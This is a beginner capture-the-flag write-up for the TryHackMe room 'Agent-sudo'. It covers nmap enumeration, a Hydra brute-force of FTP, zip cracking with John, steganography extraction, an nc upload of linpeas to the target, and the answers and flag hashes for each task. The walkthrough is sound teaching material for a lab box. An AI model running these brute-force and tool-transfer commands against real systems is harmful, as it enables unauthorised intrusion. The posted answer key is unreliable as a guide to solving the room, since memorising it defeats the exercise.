# Agent-sudo
# hello
In this write up we will look into the room "Agent-sudo" form TryHackMe,which we can be found below as well as on [Tryhackme](https://tryhackme.com).

The room is listed as an easy room, and covers a lot of different tools and aspects of security, which makes it a great room to complete for beginners.

An overview of what we’ll be using is listed here:
+ Basic linux commands
+ nmap scan
+ curl
+ Hydra
+ John
+ Steghide
+ Linpeas


## Task 1

```bash
export IP= 10.10.98.58
```

## Task 2

Let's enumrate the machine. for this section we will need the following tools:
+ nmap
+ curl

1. How many open ports?

```
3
```

```bash
# To determine open ports we can use nmap:
sudo nmap  -sV -O -sC -oN nmap/intiatl $IP 
```
| Option | Descrption |
| ------ | ---------- |
| -sC | Default scripts. Nmap will use its default scripts to gather information |
| -sV | Version detection. Nmap will try to detect the versions of services running on open ports |
| -oN | Output format. Output as nmap format |
| -O | Operating detection |

2. How you redirect yourself to a secret page?

```
user-agent
```

```bash
# to change user-agent and redirect the page
curl "http://10.10.98.58/" -A "C" -L
```

3. What is the agent name?

```
chris
```

```
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```

## Task 3

1. FTP password

```
crystal
```

```bash
hydra -l chris -P Desktop/rockyou.txt ftp://$IP 
#[21][ftp] host: 10.10.98.58   login: chris   password: crystal
```

2. Zip file password

```
alien
```
after access on ftp server we got 3 files :
+ To_agentJ.txt
+ cute-alien.jpg
+ cutie.png

then we download it by using
```bash
mget 
```
frist we reading the text file `To_agentJ.txt`
second we running command `strings` on `cutie.png` seemed like it had some txt file hidden in it
third i used `binwalk` on it 

| tool | decscription |
| ---- | ------------ |
| binwalk | a tool for finding embedded files and executables in images |

```bash
binwalk cutie.png
```
Then, this showed,that some zip file was hidden in image
so i exterct this using `binwalk` command

```bash
binwalk -e cutie.png
```
| option | decscription |
| ------ | ------------ |
| -e | to extract the files from the image |

```bash
# first we make the zip file to john hash
/opt/john/zip2john 8702.zip > hash_to_john
# second we use john to know the hash
/opt/john/john hash_to_john.txt --wordlist=/usr/share/wordlists/rockyou.txt
#alien            (8702.zip/To_agentR.txt)
# third we use 7z to extract the zip file
7z e 8702.zip 
```

3. steg password

```
Area51
```

```bash
#first 
cat To_agentR.txt

#second
echo QXJlYTUx | base64 -d
#Area51
```

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

4. Who is the other agent (in full name)?

```
james
```

There is text file hide in jpg file has important message so we use `steghide`

| Tool | Dectiption |
| ---- | ---------- |
| steghide | Steghide is steganography program which hides bits of a data file in some of the least significant bits of another file in such a way that the existence of the data file is not visible and cannot be proven |

| Options | Dectiption |
| ------- | ---------- |
| extract, --extract | extract data |
| -sf, --stegofile | select stego file |

```bash
#first
steghide extract -sf cute-alien.jpg
#wrote extracted data to "message.txt".

#second
cat message.txt
```
### message.txt
```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

5. SSH password

```
hackerrules!
```

## Task 4

1. What is the user flag?

```
b03d975e8c92a7c04146cfa7a5a313c7
```

2. What is the incident of the photo called?

we tried to open the image on machine but eog was not installed so we should download the image by using `scp`

```bash
scp james@$IP name_of_file .
```

```
roswell alien autopsy
```

## Task 5

1. (Format: CVE-xxxx-xxxx)

```
CVE-2019-14287
```
we run `linpeas`

| Tool | Description |
| ---- | ----------- |
| linpeas | a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts |

### How copy it to target machine ? 
#### from target machine

```bash
nc -nvlp 1234 > linpeas.sh
```
#### from my machine:

```bash
nc -w 3 $IP 1234 < linpeas.sh
```

#### Then marking it executable and running it:

```bash
chmod +x linpeas.sh
./linpeas
```

we run command `sudo` `-l`
```bash
sudo -l
# (ALL, !root) /bin/bash
```


2. What is the root flag?

```
b53a02f55b57d4439e3341834d70c062
```

3. (Bonus) Who is Agent R? 

```
Deskel
```